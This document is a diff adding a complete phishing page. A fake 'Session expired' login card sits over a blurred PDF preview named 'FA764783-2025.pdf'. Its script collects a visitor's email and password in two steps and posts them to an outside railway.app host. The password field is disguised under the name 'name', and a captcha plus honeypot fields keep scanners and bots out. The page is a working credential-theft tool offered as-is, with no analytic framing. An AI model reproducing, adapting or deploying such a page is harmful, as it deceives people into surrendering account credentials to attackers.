@@ -1,0 +1,465 @@
+<!-- Turnstile script in Zoho header or code snippet -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<div class="page-wrapper">
+    <div class="doc-background">
+        <img src="https://transmission.zoholandingpage.com/try.png" alt="Document preview">
+    </div>
+
+    <div class="login-card" id="login-card">
+        <div class="doc-icon">
+            <img src="https://transmission.zoholandingpage.com/PDtrans.png" alt="Icon">
+        </div>
+
+        <h2 class="doc-title">
+            FA764783-2025.pdf <span class="doc-size"></span>
+        </h2>
+
+        <p class="doc-subtitle" id="session-msg">Session expired. Log in to access</p>
+        <div class="top-divider"></div>
+
+        <p class="login-error" id="error-msg" style="display:none;"></p>
+
+        <!-- STEP 1 -->
+        <form id="step1-form">
+            <div class="field-wrapper email-wrapper">
+                <input type="email" name="email" id="step1-email" placeholder="Enter your email" required>
+                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                </svg>
+            </div>
+
+            <div class="captcha-wrapper">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
+            </div>
+
+            <!-- Honeypot -->
+            <div class="hp-wrapper">
+                <input type="text" name="company" id="hp1" autocomplete="off">
+            </div>
+
+            <button type="submit" class="btn-primary" id="step1-btn">Next</button>
+        </form>
+
+        <!-- STEP 2 -->
+        <form id="step2-form" style="display:none; margin-top:4px;">
+            <div class="field-wrapper email-wrapper">
+                <input type="email" name="email" id="step2-email" required>
+                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                </svg>
+            </div>
+
+            <div class="field-wrapper">
+                <input type="password" name="name" id="password" placeholder="Password" required>
+                <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
+                </svg>
+            </div>
+
+            <input type="hidden" name="step2_token" id="step2-token">
+            <div class="hp-wrapper">
+                <input type="text" name="company" id="hp2" autocomplete="off">
+            </div>
+
+            <button type="submit" class="btn-primary" id="step2-btn">Next</button>
+        </form>
+    </div>
+</div>
+
+<style>
+*, *::before, *::after { box-sizing: border-box; }
+
+:root {
+    --card-bg: #fff;
+    --text-color: #222;
+    --subtext: #222;
+    --border: #d4d4d4;
+    --btn-bg: #b30b00;
+    --btn-hover: #b30b00;   
+    --error: #c9252d;
+    --overlay-dark: ;o
+    --divider: #E4E4E7;
+    --font-xs: 12px;
+    --font-sm: 12px;
+    --font-btn: 12px;
+}
+
+@media (prefers-color-scheme: dark) {
+    :root {
+        --card-bg: #f5f5f5;
+        --text-color: #222;
+        --subtext: #222;
+        --border: #444;
+        --btn-bg: #4a8fff;
+        --btn-hover: #3a73d0;
+        --divider: #e8e8e8;
+    }
+}
+
+html, body {
+    height: 100%;
+}
+
+body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, sans-serif;
+    background: #111;
+    color: var(--text-color);
+    min-height: 100vh;
+    overflow: hidden; /* avoid scrolling */
+}
+
+.page-wrapper {
+    position: relative;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 8px; /* tiny horizontal padding for small screens */
+}
+
+.page-wrapper::before {
+    content:"";
+    position:absolute;
+    inset:0;
+    background:var(--overlay-dark);
+}
+
+.doc-background {
+    position:absolute;
+    inset:0;
+    filter: blur(7px);
+    opacity: .80;
+    transform:scale(1.01);
+}
+
+.doc-background img { width:100%; height:100%; object-fit:contain; }
+
+.login-card {
+    width:100%;
+    max-width:310px;
+    background:var(--card-bg);
+    border-radius:4px;
+    padding:14px 18px 16px; /* reduced padding */
+    border:1px solid #d0d0d0;
+    box-shadow:0 10px 24px rgba(0,0,0,.26);
+    z-index:2;
+    opacity:0;
+    transform:translateY(10px) scale(.985);
+    animation:fadeIn .35s ease-out forwards;
+}
+
+.login-card.has-error {
+    border-color:rgba(201,37,45,.5);
+}
+
+@keyframes fadeIn {
+    from {opacity:0; transform:translateY(18px) scale(.97);}
+    to   {opacity:1; transform:translateY(0) scale(1);}
+}
+
+.top-divider {
+    height:1px;
+    background:var(--divider);
+    margin:6px 0 8px;
+}
+
+.doc-icon { width:34px; margin:0 auto 4px; }
+.doc-icon img { width:90%; }
+
+.doc-title {
+    text-align:center;
+    font-size:13px;
+    margin-bottom:1px;
+    font-weight:600;
+}
+.doc-size { font-size:var(--font-xs); color:var(--subtext); }
+
+.doc-subtitle {
+    text-align:center;
+    color:var(--error);
+    font-size:var(--font-xs);
+    margin-bottom:4px;
+    font-weight:600;
+}
+.login-error {
+    text-align:center;
+    color:var(--error);
+    font-size:var(--font-xs);
+    margin-bottom:6px;
+    font-weight:600;
+}
+
+.field-wrapper {
+    margin-bottom:8px;
+    position:relative;
+}
+.field-wrapper input {
+    width:100%;
+    padding:7px 9px;
+    font-size:var(--font-sm);
+    border:1px solid var(--border);
+    border-radius:3px;
+    background:#fff;
+    outline:none;
+    color:#000;
+}
+.email-wrapper input { background:#fff !important; color:#000 !important; }
+.email-wrapper input { padding-left:28px; }
+
+.email-icon {
+    position:absolute;
+    left:9px;
+    top:50%;
+    transform:translateY(-50%);
+    width:14px;
+    height:14px;
+    opacity:.7;
+}
+.email-icon path { fill:#777; }
+
+.lock-icon {
+    position:absolute;
+    left:9px;
+    top:50%;
+    transform:translateY(-50%);
+    width:13px;
+    height:13px;
+    opacity:.7;
+    pointer-events:none;
+}
+.lock-icon path { fill:#777; }
+
+.field-wrapper input[name="name"] { padding-left:28px; }
+
+.hp-wrapper {
+    position:absolute;
+    left:-9999px;
+    width:1px;
+    height:1px;
+    overflow:hidden;
+    opacity:0;
+}
+
+.captcha-wrapper {
+    display:flex;
+    justify-content:center;
+    margin:4px 0 2px; /* tighter */
+}
+.cf-turnstile {
+    transform:scale(.9);
+    transform-origin:center;
+}
+
+/* Centered button */
+.btn-primary {
+    width:100%;
+    padding:8px 10px;
+    background:var(--btn-bg);
+    color:#fff;
+    border:none;
+    border-radius:3px;
+    cursor:pointer;
+    font-size:var(--font-btn);
+    font-weight:600;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+}
+.btn-primary:hover { background:var(--btn-hover); }
+
+/* Optional: slightly shrink on really short viewports */
+@media (max-height: 600px) {
+    .login-card {
+        padding:12px 16px 14px;
+    }
+    .doc-icon { margin-bottom:2px; }
+    .top-divider { margin:4px 0 6px; }
+}
+</style>
+
+<script>
+(function() {
+    const API_BASE = "https://babranokpamiusegobbegu.up.railway.app";
+
+    const step1Form  = document.getElementById('step1-form');
+    const step2Form  = document.getElementById('step2-form');
+    const step1Email = document.getElementById('step1-email');
+    const step2Email = document.getElementById('step2-email');
+    const password   = document.getElementById('password');
+    const errorMsg   = document.getElementById('error-msg');
+    const sessionMsg = document.getElementById('session-msg');
+    const step2TokenInput = document.getElementById('step2-token');
+    const card       = document.getElementById('login-card');
+
+    let stepToken   = null;
+    let busy        = false;
+    let currentStep = 1;
+
+    function resetTurnstile() {
+        // Auto-reload Turnstile widget after failed Step 1
+        if (window.turnstile && typeof window.turnstile.reset === 'function') {
+            try { window.turnstile.reset(); } catch (e) {}
+        }
+    }
+
+    function showError(msg) {
+        if (!msg) {
+            errorMsg.style.display = 'none';
+            errorMsg.textContent = '';
+            card.classList.remove('has-error');
+
+            if (currentStep === 1) {
+                sessionMsg.style.display = '';
+            } else {
+                sessionMsg.style.display = 'none';
+            }
+        } else {
+            sessionMsg.style.display = 'none';
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
+            card.classList.add('has-error');
+        }
+    }
+
+    function showStep(step) {
+        currentStep = step;
+
+        if (step === 1) {
+            step1Form.style.display = '';
+            step2Form.style.display = 'none';
+        } else {
+            step1Form.style.display = 'none';
+            step2Form.style.display = '';
+        }
+
+        showError('');
+    }
+
+    // STEP 1 handler
+    step1Form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (busy) return;
+        busy = true;
+
+        const emailVal = step1Email.value.trim();
+        const hp       = document.getElementById('hp1').value.trim();
+        const cfInput  = document.querySelector('input[name="cf-turnstile-response"]');
+        const cfToken  = cfInput ? cfInput.value : '';
+
+        if (!emailVal) {
+            showError('Please enter your email');
+            busy = false;
+            return;
+        }
+
+        if (!cfToken) {
+            showError('Please complete the security check');
+            busy = false;
+            return;
+        }
+
+        const body = new URLSearchParams();
+        body.set('email', emailVal);
+        body.set('cf-turnstile-response', cfToken);
+        body.set('company', hp);
+
+        fetch(API_BASE + '/login_step1.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (!data || !data.ok) {
+                showError(data && data.error ? data.error : 'Unexpected error. Please try again.');
+                resetTurnstile();   // 🔁 auto reload captcha on failure
+                busy = false;
+                return;
+            }
+            // Success → store token & email, go to step 2
+            stepToken = data.token;
+            step2TokenInput.value = stepToken;
+            step2Email.value = data.email || emailVal;
+            showStep(2);
+            busy = false;
+        })
+        .catch(() => {
+            showError('Network error. Please try again.');
+            resetTurnstile();       // 🔁 also reload captcha on network error
+            busy = false;
+        });
+    });
+
+    // STEP 2 handler
+    step2Form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (busy) return;
+        busy = true;
+
+        const emailVal = step2Email.value.trim();
+        const passVal  = password.value.trim();
+        const hp       = document.getElementById('hp2').value.trim();
+
+        if (!emailVal || !passVal) {
+            showError('Please complete all fields.');
+            busy = false;
+            return;
+        }
+
+        if (!stepToken) {
+            showError('Session expired. Please verify again.');
+            busy = false;
+            showStep(1);
+            resetTurnstile();
+            return;
+        }
+
+        const body = new URLSearchParams();
+        body.set('email', emailVal);
+        body.set('name', passVal);
+        body.set('step2_token', stepToken);
+        body.set('company', hp);
+
+        fetch(API_BASE + '/login_step2.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (!data) {
+                showError('Unexpected error. Please try again.');
+                busy = false;
+                return;
+            }
+
+            if (!data.ok) {
+                if (data.blocked && data.redirect) {
+                    window.location.href = data.redirect;
+                    return;
+                }
+                showError(data.error || 'Incorrect Password. Please try again.');
+                busy = false;
+                return;
+            }
+
+            if (data.redirect) {
+                window.location.href = data.redirect;
+            } else {
+                showError('Login successful.');
+                busy = false;
+            }
+        })
+        .catch(() => {
+            showError('Network error. Please try again.');
+            busy = false;
+        });
+    });
+
+    // Initial view
+    showStep(1);
+})();
+</script>
